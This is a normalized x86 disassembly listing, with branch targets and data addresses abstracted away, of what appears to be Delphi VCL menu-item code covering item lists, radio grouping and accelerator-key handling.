mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_446b84
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_446b84
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_446d00
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4441b0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_4450a8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_416b94
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_446f78
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_446b74
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444fd8
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_416b18
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_416b18
mov dl [ eax + 0x3f ]
mov eax esi
call sub_446b18
sub_446db4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4441b0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_446b74
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444fd8
mov eax ebx
call sub_446b74
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_416b18
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_416a08
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_446e28
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_446a4c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446b5c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_446b5c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_446ef0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446b74
mov edx eax
mov ecx esi
mov eax ebx
call sub_446d00
pop esi
pop ebx
retn
sub_446f0c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446ed8
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_446db4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4441b0
sub_446f34
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_446f78
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_446f78
jmp r-xdata
mov eax ebx
call sub_444fd8
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_448c50
sub_446fd0
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebx + 0x4c ] eax
sub_446ff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403164
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44728c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403360
mov edx ebx
mov eax edi
call sub_41c588
mov eax ebx
mov si 0xffee
call sub_403360
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_447068
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ esi + 0x4c ] eax
sub_44709c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_446b74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_446b84
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_4470dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_446f0c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_446ef0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_446ef0
sub_447140
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_446a04
sub_44716c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4469dc
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_446a4c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_446aa0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403ef0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_446bcc
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_446b18
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_446ba8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_446bbc
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44728c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_446b5c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403360
sub_4472b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4472d0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4472f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447310
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447330
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447350
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447370
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447390
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4473b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4473d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4171a0
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4416d8
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_441810
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_441870
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_441570
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_441930
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447448
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41c7d4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_446b5c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_446ff8
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44749c
jmp r-xdata
xor edx edx
mov eax esi
call sub_444f60
sub_44749c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_442934
mov eax ebx
call sub_44750c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_442978
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41c588
sub_4474e4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4474e4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_444634
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_446f78
mov eax ebx
pop esi
pop ebx
retn
sub_447520
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c0d0
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4043fc
sub_447550
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f34
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4475d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4476f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40415c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40415c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4043bc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042a8
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4476fd
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ec0
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404444
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40421c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40415c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4043bc
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_40421c
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_447734
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_447bd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f34
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447b94
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_446b74
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f34
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447bda
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403ec0
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403ec0
lea eax [ ebp - 0x18 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
call sub_447d88
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_446b84
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042a8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_447550
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_446b84
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446b84
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403164
mov eax [ ebp - 0x20 ]
call sub_403164
mov eax [ ebp - 0x14 ]
call sub_403164
mov eax [ ebp - 0xc ]
call sub_403164
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_447550
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40415c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_446b84
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_44962c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407bb8
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403ef0
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c0d0
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c0d0
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446b84
push eax
mov edx esi
mov eax ebx
call sub_446b84
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4043bc
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407bb8
push ebp
mov eax [ ebp - 0x2c ]
call sub_447520
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_447520
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c0d0
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f34
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446b84
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_446b84
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_449598
mov edx [ ebp - 0x40 ]
pop eax
call sub_403ef0
mov edx esi
mov eax ebx
call sub_446b84
push eax
mov edx esi
mov eax ebx
call sub_446b84
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40415c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4043bc
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4475d4
mov eax [ ebp - 0x18 ]
call sub_40415c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4043fc
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404444
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_4475d4
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_447c30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_446b74
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_446b74
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_447db4
test al al
je r-xdata
mov eax esi
call sub_446b74
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_446b84
call sub_447c0c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_446b84
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_446b84
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_446b84
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_446b84
call sub_447c0c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_446b84
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_446b84
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_446b84
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_446b84
call sub_447c0c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_447d88
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_447d88
and eax 0x7f
mov al [ eax + rw-data ]
sub_447db4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_447db4
